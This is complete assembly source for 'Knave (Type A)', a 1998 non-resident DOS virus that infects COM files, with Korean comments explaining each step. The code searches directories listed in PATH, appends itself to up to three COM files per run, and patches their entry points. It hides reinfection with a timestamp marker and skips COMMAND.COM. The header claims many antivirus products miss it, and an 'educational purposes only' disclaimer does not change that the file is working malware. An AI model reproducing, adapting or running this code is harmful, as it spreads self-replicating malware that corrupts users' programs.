;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;					       \\\\\\\	\	\   \\\\\\\
;                                             \          \     \   \
;          Knave  (Type A)                    \           \   \    \    98/05
;					      \ 	   \ \	   \
;                                              \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : Knave
; Author     : Red_Devils
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/25
; Type       : Non Resident COM
;
;   !*< 법률적 의무 >********************************************************!
;   *                                                                        *
;   * 경고 !                                                                 *
;   *        이 정보는 교육적인 목적으로만 사용되어야 합니다. 우리는 이      *
;   *        정보를 사용해서 발생하는 어떤 문제에 대해서도 책임을 지지 않    *
;   *        습니다. 모든 책임은 글을 읽는 사람에게 있습니다.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; Miny2 (Type E) 를  개량했다. Miny2 와는 전혀 다른 방식으로 작동된다.
;
; 1. PATH 를 이용해서 감염 시킬 파일을 찾는다.
; 2. 세그먼트 변경을 통해서 델타 오프셋을 구할 필요가 없다.
;
; 이번 버전은 쉬운 이해를 위해서 별다른 기교는 사용하지 않았다. 덕분에 일부 인
; 공지능검사에서 진단되긴 하지만, 상당히 많은 AV 에서는 아무것도 진단하지 못한
; 다.
;
; PATH 를 사용하기 위해서 두가지 함수를 사용한다.
;
; Get_PathAddress : 환경영역에서 PATH= 를 찾아서 첫번째 디렉토리를 가르킨다.
; Use_Path        : 환경영역의 경로를 버퍼로 복사하고 다음 경로를 가르킨다.
;
; ! Knave (Type A) : 경로에서 COM 파일 감염
;
;
; AV Test :
; Heuristic Test :
;
;
; TK-MAN : ALT-X 분석이 도움이 되었습니다. !
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL   TINY
            .CODE
            .286
            org   0h

 VIRLEN     equ   (End_Virus - Knave)   ; 바이러스 길이

 Knave:
            mov   ax,cs                 ;
 AddSeg:    add   ax,0010h              ; 바이러스가 새로운 세그먼트 에서 시작
            push  ax                    ; 되도록 고친다.
            mov   ax,offset New_Segment ;
            push  ax                    ;
            retf                        ;

 New_Segment:
            push  cs                    ;
            pop   ds                    ; cs=ds

            mov   OldSegment, es        ; 원래 세그먼트 저장
            mov   ax, word ptr es:[002Ch]
            mov   Enviraddr,ax

            push  cs                    ;
            pop   es                    ;

            mov   si, offset Com_Head   ; 앞부분 복구
            mov   di, offset Com_Head2  ; 잠시 복사
            movsw
            movsw

            mov   ah,19h                ;
            int   21h
            add   al,'A'
            mov   byte ptr OldDir, al
            mov   word ptr OldDir+1,'\:'

            mov   ah,47h
            xor   dl,dl                 ; 옛 디렉토리 저장
            mov   si, offset OldDir + 3 ;
            int   21h                   ;

            mov   byte ptr Count,00     ; 감염카운터 0

            call  Get_Path_Address      ; 경로 주소 얻기

            mov   ah,2fh                ; DTA 주소 얻기
            int   21h
            push  es
            push  bx

            push  cs
            pop   es

            mov   ah,1ah                ;
            mov   dx, offset NewDTA     ; 새로운 DTA 지정
            int   21h

 FindFirst:
            mov   ah,4Eh                ; 파일 찾기
            mov   cx,00100011B          ; 파일 속성
            lea   dx,Match_COM          ; 찾고자 하는 파일 (*.c?m)
 Find:      int   21h
            jnc   callInfect            ; 에러면 다른 경로로 이동
            call  Use_PATH
            cmp   al, 0FFh              ; No More Path ?
            jz    Set_OldDir
            jmp   FindFirst
 callInfect:
            call  ChkInfected           ; 감염 루틴 호출
            cmp   byte ptr Count,3      ; 3 개 감염 시켰나 ?
            jz    Set_OldDir            ; 그러면 감염 활동 끝
            mov   ah,4Fh                ; 다음 파일 찾기
            jmp   Find

 Set_OldDir:
            mov   ah, 0Eh
            mov   dl, byte ptr OldDir
            sub   dl, 'A'
            int   21h

            mov   ah,3Bh                ; 원래 디렉토리로 이동
            lea   dx, OldDir
            int   21h

            pop   dx
            pop   ds
            mov   ah, 1Ah               ;
            int   21h

            push  cs
            pop   ds

            mov   ax, word ptr OldSegment
            mov   es,ax
            push  ax
            mov   ax,100h
            push  ax
            mov   si, offset Com_Head2  ; COM 앞부분 복구
            mov   di,0FFh
            inc   di
            movsw                       ; 앞부분 4 바이트 복구
            movsw                       ;
            xor   ax,ax
            push  es
            pop   ds
            retf                        ; 원래 COM 파일 실행

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; 기능 : PathAddr 에 저장된 주소값을 PathBuffer 로 복사한후 해당 디렉토리로
;        이동한다. PathAddr 이 0 이면 더이상의 경로가 없다.
;
; 입력 : None
; 리턴 : 정  상 : 해당 PATH 로 이동
;        에러시 : AL = FFh
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Use_PATH   proc  near                  ; 더이상 사용할 경로가
            push  ds
            mov   al, 0FFh
            cmp   word ptr PathAddr,0000; 없는가?
            jz    Use_Path_Exit
            xor   al,al
 Set_PathInit:
            mov   si, word ptr PathAddr ; 경로 위치 오프셋
            mov   ds, word ptr EnvirAddr; 환경역역 주소
            mov   di, offset PathBuffer ; 파일 이름

 UP_Loop:   lodsb                       ;
            dec   al
            cmp   AL, ';'-1             ; 디렉토리 구별인가?
            jz    UP_01
            cmp   al,0FFh               ; PATH 끝인가?
            jz    NomorePATH
            inc   al
            stosb                       ; 복사
            jmp   UP_Loop

 NomorePATH:
            xor   si,si                 ; 더이상의 디렉토리가 없다.

 UP_01:     mov   word ptr CS:PathAddr,SI    ; 경로 주소값
            xor   al,al
            stosb
            push  cs
            pop   ds

            mov   ah, 0Eh
            mov   dl, byte ptr PathBuffer
            sub   dl, 'A'
            int   21h
            jc    Use_Path

            pusha
            mov   si, offset PathBuffer
 print_loop:
            lodsb
            mov   ah,2
            mov   dl,al
            int   21h
            or    dl,dl
            jnz   print_loop
            popa

            mov   ah,3Bh                ; 해당 디렉토리로 이동
            mov   dx, offset PathBuffer
            Int   21h
            jc    Use_Path
 Use_Path_Exit:
            pop   ds
            ret
 Use_Path   endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; 실제 바이러스 감염 루틴
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 ChkInfected:                           ; 감염 여부를 확인한다.
            cmp   word ptr NewDTA+1Eh,'OC' ; COMMAND.COM 인가 ?
            jz    Skip_thisfile
            mov   al,NewDTA+16h         ; 62 초 인지 검사한다.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
 Skip_thisfile:
            RET                         ; 62 초 이면 다음 파일 검사로 이어짐

 Infect:    mov   ax, 4301h             ; 읽기/쓰기 속성으로 바꿈
            xor   cx,cx
            mov   dx, offset NewDta+1Eh
            int   21h
            jc    Skip_thisfile         ; 에러 발생

            mov   ax, 3D02h             ; 파일 오픈
            int   21h
            jc    Skip_thisfile         ;

            xchg  ax,bx                 ; BX = 파일핸들

            mov   ax, 5700h             ; 파일 작성 시간 얻기
            int   21h
            push  cx                    ; 작성 시간 저장
            push  dx                    ;

            mov   ah, 3Fh               ; 앞부분 읽기
            lea   dx, COM_Head          ; 버퍼 주소
            mov   cx, 0004              ; 4 바이트
            int   21h

            cmp   byte ptr COM_Head+1,'Z'
            jnz   lseek2                ; EXE 파일 인가 ?
            nop
            cmp   byte ptr COM_Head,'M'
            jz    error

 lseek2:
            mov   al,02                 ; 파일 끝으로 이동
            call  lseek
            or    dx,dx                 ; 64 KB 이상인가 ?
            jnz   Error                 ; 다음 검사때 오픈 시키지 않기위해서

            mov   dx,ax
            add   dx,0Fh                ; 16 의 배수로 만든다.
            and   dx,0FFF0h
            mov   al, 0
            call  lseek1

            push  ax
            mov   cl,04                 ; 세그먼트 계산 (길이/16) = 세그먼트
            shr   ax,cl
            add   ax,10h
            mov   word ptr AddSeg+1, ax
            pop   ax                    ;

            sub   ax,3                  ; 점프값 계산
            mov   word ptr JumpCode+1,ax;

            mov   ah, 40h               ; 바이러스 쓰기
            mov   cx, VIRLEN
            mov   dx, offset Knave
            int   21h

            mov   al,00                 ; 처음으로 이동
            call  lseek

            mov   ah, 40h               ; 점프 코드 쓰기
            mov   cx,0004
            mov   byte ptr JumpCode,0EAh
            dec   byte ptr JumpCode     ; E9h = JMP
            mov   dx, offset JumpCode
            int   21h

            inc   byte ptr Count        ; 감염 갯수 증가
 Error:
            pop   dx                    ; 파일 작성 시간 복구
            pop   cx                    ;
            or    cx,+1Fh               ; 62 초로 만들기
            mov   ax, 5701h             ; 파일 작성 시간 복구
            int   21h

            mov   ah, 3Eh               ; 파일 닫기
            int   21h
            RET

 lseek      Proc  Near                  ; 포인터 이동
            xor   dx,dx
 lseek1:
            xor   cx,cx
            mov   ah,40h                ; AH=42h
            inc   ah                    ;
            inc   ah
            int   21h
            ret
 lseek      Endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                     환경 영역에서 PATH= 위치 얻기
;
; EnvirAddr  : 환영영역 주소값
; PathAddr   : 사용할 경로의 주소
; PathBuffer : 디렉토리를 옮기기 위해 사용되는 경로 버퍼
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Get_PATH_Address   Proc Near
            pusha
            push    ds
            mov     DS, word ptr EnvirAddr  ; 환경영역 주소값
            xor     si,si
            mov     cx, 5000h           ; 반복횟수
 Search_PATH:
            lodsb                       ; 찾는 문자열 'PATH='
            cmp     AL,'P'              ; 'P' 를 찾았나 ?
            jnz     SP_Loop
            mov     ax,DS:[SI]
            cmp     ax,'TA'             ; TA ?
            jnz     SP_Loop
            cmp     word ptr DS:[SI+2],'=H'    ; H= (PATH=)
            jz      SavePATH
 SP_Loop:   loop    Search_PATH
 SavePATH:  add     SI,0004             ; SI 는 경로를 가르키고 있다.
            mov     word ptr CS:PathAddr,SI    ; 경로의 주소
            mov     DI, offset PathBuffer
            pop     ds
            popa
            RET

 Get_PATH_Address   Endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; Data 영역
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 COM_head   db    0CDh,20h,90h,90h      ; COM 앞부분
 Match_COM  db    '*.c?m',00            ; COM 파일 찾기
 Virus_Name db    '[Knave] Type.A  by Red_Devils/CVC,Corea 98/04'
 End_Virus:                             ; 실제 써지는 바이러스 끝

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; 파일에는 저장되지 않는 부분
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 COM_Head2  db    00,00,00,00           ; 임시 COM 앞부분
 EnvirAddr  dw    ?                     ; 환경 영역 주소
 PathAddr   dw    ?                     ; 경로 주소
 OldSegment dw    ?                     ; 원래 세그먼트
 Count      db    ?                     ; 감염 갯수
 JumpCode   db    0E9h,00,00,00         ; 점프 값
 PathBuffer db    80h dup ('$')         ;
 NewDTA     db    80h dup (00)          ; 새로운 DTA 영역
 OldDir     db    80h dup (00)          ; 옛 디렉토리 저장 장소

            END   Knave

